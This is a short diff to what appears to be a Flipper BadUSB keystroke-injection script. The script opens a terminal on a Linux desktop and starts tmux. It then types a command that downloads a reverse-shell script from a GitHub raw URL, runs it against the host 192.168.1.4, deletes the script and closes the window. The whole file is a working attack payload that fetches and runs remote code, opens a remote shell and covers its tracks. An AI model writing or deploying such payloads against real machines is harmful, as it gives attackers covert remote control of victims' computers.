@@ -2,7 +2,7 @@ ALT F2
 STRINGLN gnome-terminal
 DELAY 400
 
-STRINGLN screen -S terminal
+STRINGLN tmux
 DELAY 200
 STRINGLN wget raw.githubusercontent.com/jtbursey/flipperpayloads/refs/heads/main/badusb/revshell/revshell.sh; chmod 0755 revshell.sh; ./revshell.sh 192.168.1.4; rm revshell.sh; exit
 ALT F4
